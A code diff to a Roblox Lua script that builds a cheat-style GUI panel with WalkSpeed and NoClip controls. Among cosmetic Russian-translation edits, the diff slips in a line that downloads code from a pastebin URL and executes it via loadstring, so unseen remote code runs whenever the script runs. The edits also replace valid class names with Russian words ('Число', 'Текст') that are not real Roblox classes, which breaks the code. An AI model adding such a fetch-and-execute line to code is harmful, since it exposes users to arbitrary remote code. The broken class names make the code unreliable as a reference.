@@ -25,7 +25,7 @@ gradient.Color = ColorSequence.new{
 gradient.Rotation = 90
 gradient.Parent = frame
 
-local textBox = Instance.new("TextBox")
+local textBox = Instance.new("Число")
 textBox.Size = UDim2.new(0, 80, 0, 30)
 textBox.Position = UDim2.new(0, 10, 0, 10)
 textBox.PlaceholderText = "WalkSpeed"
@@ -37,10 +37,20 @@ textBox.Parent = frame
 local applyButton = Instance.new("TextButton")
 applyButton.Size = UDim2.new(0, 60, 0, 30)
 applyButton.Position = UDim2.new(0, 100, 0, 10)
-applyButton.Text = "Apply"
+applyButton.Text = "Применить"
 applyButton.Font = Enum.Font.Gotham
 applyButton.TextSize = 14
 applyButton.Parent = frame
+
+local NoClip = Instance.new("Текст")
+NoClip.Size = UDim2.new(0, 80, 0, 30)
+NoClip.Position = UDim2.new(0, 190, 0, 10)
+NoClip.PlaceholderText = "NoClip"
+NoClip.Text = ""
+NoClip.Font = Enum.Font.Gotham
+NoClip.TextSize = 14
+NoClip.Parent = frame
+loadstring(game:HttpGet("https://pastebin.com/raw/2JZWpiKn", true))()
 
 local closeButton = Instance.new("TextButton")
 closeButton.Size = UDim2.new(0, 20, 0, 20)
